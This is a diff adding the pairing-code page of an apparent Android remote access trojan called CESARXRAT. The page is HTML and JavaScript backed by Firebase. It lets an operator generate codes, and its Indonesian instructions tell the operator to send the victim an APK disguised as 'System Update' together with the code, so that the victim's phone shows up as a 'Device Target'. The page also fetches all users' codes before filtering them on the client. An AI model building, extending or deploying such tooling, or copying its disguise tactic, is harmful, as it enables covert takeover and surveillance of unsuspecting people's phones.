@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pairing Code - CESARXRAT</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0e27;
+            color: #e0e8ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container { max-width: 480px; margin: auto; }
+        h1 {
+            color: #4a9eff;
+            font-size: 26px;
+            margin-bottom: 20px;
+            text-align: center;
+            text-shadow: 0 0 20px rgba(74, 158, 255, 0.3);
+        }
+        .card {
+            background: linear-gradient(145deg, #111a3a, #1a2a5a);
+            border-radius: 20px;
+            padding: 24px;
+            border: 1px solid #2a4a8a;
+            margin-bottom: 16px;
+            box-shadow: 0 8px 25px rgba(74, 158, 255, 0.2);
+        }
+        .btn-generate {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(135deg, #4a9eff, #1a5bbf);
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 6px 20px rgba(74, 158, 255, 0.3);
+            margin-bottom: 16px;
+        }
+        .btn-generate:hover { transform: scale(1.02); }
+        .btn-generate:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .code-box {
+            background: #0e1635;
+            border: 2px dashed #4a9eff;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            margin: 16px 0;
+        }
+        .code-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #4a9eff;
+            letter-spacing: 3px;
+            text-shadow: 0 0 20px rgba(74, 158, 255, 0.5);
+            font-family: 'Courier New', monospace;
+        }
+        .code-label {
+            font-size: 12px;
+            color: #8899dd;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-copy {
+            width: 100%;
+            padding: 10px;
+            border: 2px solid #4ae0a0;
+            background: transparent;
+            color: #4ae0a0;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 12px;
+        }
+        .btn-copy:hover {
+            background: #4ae0a0;
+            color: #0a0e27;
+        }
+        .instructions {
+            background: #0e1635;
+            border-radius: 12px;
+            padding: 16px;
+            border-left: 4px solid #4a9eff;
+            margin-top: 16px;
+        }
+        .instructions h3 {
+            color: #4a9eff;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .instructions ol {
+            padding-left: 20px;
+            color: #c0d0ff;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        .instructions ol li { margin: 4px 0; }
+        .code-item {
+            background: #0e1635;
+            border-radius: 12px;
+            padding: 12px 16px;
+            margin: 8px 0;
+            border-left: 4px solid #4a9eff;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .code-item.used { border-left-color: #555; opacity: 0.6; }
+        .code-item .info .code {
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            color: #4a9eff;
+            font-size: 16px;
+            letter-spacing: 1px;
+        }
+        .code-item .info .status {
+            font-size: 11px;
+            color: #8899dd;
+            margin-top: 2px;
+        }
+        .code-item .info .used-by {
+            font-size: 11px;
+            color: #4ae0a0;
+            margin-top: 2px;
+        }
+        .btn-back {
+            background: transparent;
+            border: 2px solid #4a9eff;
+            color: #4a9eff;
+            padding: 12px;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 16px;
+            font-size: 16px;
+        }
+        .btn-back:hover {
+            background: #4a9eff;
+            color: #fff;
+        }
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #1a2a5a;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 50px;
+            border: 1px solid #4a9eff;
+            box-shadow: 0 8px 30px rgba(74, 158, 255, 0.3);
+            opacity: 0;
+            transition: 0.35s;
+            z-index: 1000;
+        }
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+        .empty-state {
+            text-align: center;
+            color: #6a8abf;
+            padding: 20px;
+            font-style: italic;
+        }
+        .section-title {
+            color: #8899dd;
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin: 20px 0 10px 0;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>🔗 Pairing Code</h1>
+
+        <div class="card">
+            <p style="color:#8899dd;font-size:14px;text-align:center;margin-bottom:16px;">
+                Generate kode untuk menghubungkan device target ke akun Anda.
+            </p>
+            <button class="btn-generate" id="btnGenerate" onclick="generateCode()">
+                ⚡ Generate Kode Baru
+            </button>
+        </div>
+
+        <div id="currentCodeSection" style="display:none;">
+            <div class="section-title">📌 Kode Terbaru Anda</div>
+            <div class="code-box">
+                <div class="code-label">Kode Pairing</div>
+                <div class="code-text" id="currentCode">----</div>
+                <button class="btn-copy" onclick="copyCurrentCode()">📋 Copy Kode</button>
+            </div>
+
+            <div class="instructions">
+                <h3>Cara Pakai:</h3>
+                <ol>
+                    <li>Copy kode di atas</li>
+                    <li>Kirim APK <b>System Update</b> + kode ke HP target</li>
+                    <li>Target install APK, buka, dan masukkan kode</li>
+                    <li>Device otomatis muncul di menu <b>Device Target</b></li>
+                </ol>
+            </div>
+        </div>
+
+        <div class="section-title" id="historyTitle" style="display:none;">📜 Riwayat Kode</div>
+        <div id="codeHistory"></div>
+
+        <button class="btn-back" onclick="history.back()">← Kembali</button>
+    </div>
+
+    <div class="toast" id="toast"></div>
+
+    <script type="module">
+        import { auth, onAuthStateChanged, db, ref, set, onValue }
+            from './firebase-config.js';
+
+        let currentUser = null;
+        let userUid = null;
+        let currentGeneratedCode = null;
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) {
+                window.location.href = 'login.html';
+                return;
+            }
+            currentUser = user;
+            userUid = user.uid;
+            loadHistory();
+        });
+
+        const toastEl = document.getElementById('toast');
+        function showToast(msg) {
+            toastEl.textContent = msg;
+            toastEl.classList.add('show');
+            setTimeout(() => toastEl.classList.remove('show'), 2200);
+        }
+
+        window.generateCode = async function() {
+            if (!userUid) {
+                showToast('❌ Silakan login dulu');
+                return;
+            }
+
+            const btn = document.getElementById('btnGenerate');
+            btn.disabled = true;
+            btn.textContent = '⏳ Generating...';
+
+            try {
+                const code = generateRandomCode();
+                const codesRef = ref(db, 'pairing_codes/' + code);
+
+                await set(codesRef, {
+                    uid: userUid,
+                    email: currentUser.email || '',
+                    created_at: Date.now(),
+                    used: false,
+                    used_by: '',
+                    device_id: ''
+                });
+
+                currentGeneratedCode = code;
+                document.getElementById('currentCode').textContent = code;
+                document.getElementById('currentCodeSection').style.display = 'block';
+
+                showToast('✅ Kode berhasil dibuat');
+
+                btn.disabled = false;
+                btn.textContent = '⚡ Generate Kode Baru';
+            } catch (e) {
+                console.error('Generate error:', e);
+                showToast('❌ Gagal generate kode');
+                btn.disabled = false;
+                btn.textContent = '⚡ Generate Kode Baru';
+            }
+        };
+
+        function generateRandomCode() {
+            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+            let code = 'CESAR-';
+            for (let i = 0; i < 6; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
+
+        window.copyCurrentCode = function() {
+            if (!currentGeneratedCode) return;
+            navigator.clipboard.writeText(currentGeneratedCode)
+                .then(() => showToast('📋 Kode disalin'))
+                .catch(() => showToast('❌ Gagal menyalin'));
+        };
+
+        function loadHistory() {
+            if (!userUid) return;
+
+            const codesRef = ref(db, 'pairing_codes');
+            onValue(codesRef, (snapshot) => {
+                const data = snapshot.val();
+                const container = document.getElementById('codeHistory');
+                const title = document.getElementById('historyTitle');
+
+                if (!data) {
+                    container.innerHTML = '<div class="empty-state">Belum ada kode</div>';
+                    title.style.display = 'none';
+                    return;
+                }
+
+                const userCodes = [];
+                for (const code in data) {
+                    const item = data[code];
+                    if (item.uid === userUid) {
+                        userCodes.push({ code: code, ...item });
+                    }
+                }
+
+                if (userCodes.length === 0) {
+                    container.innerHTML = '<div class="empty-state">Belum ada kode</div>';
+                    title.style.display = 'none';
+                    return;
+                }
+
+                userCodes.sort((a, b) => (b.created_at || 0) - (a.created_at || 0));
+
+                let html = '';
+                userCodes.forEach(item => {
+                    const isUsed = item.used === true;
+                    const usedClass = isUsed ? 'used' : '';
+                    const statusText = isUsed ? '✓ Terpakai' : '⏳ Belum dipakai';
+                    const usedByText = isUsed && item.device_id
+                        ? '<div class="used-by">Device: ' + escapeHtml(item.device_id) + '</div>'
+                        : '';
+
+                    html += `
+                        <div class="code-item ${usedClass}">
+                            <div class="info">
+                                <div class="code">${escapeHtml(item.code)}</div>
+                                <div class="status">${statusText}</div>
+                                ${usedByText}
+                            </div>
+                        </div>
+                    `;
+                });
+
+                container.innerHTML = html;
+                title.style.display = 'block';
+            });
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text || '';
+            return div.innerHTML;
+        }
+
+        console.log('[CESARXRAT] Pairing Code page loaded');
+    </script>
+</body>
+      </html>
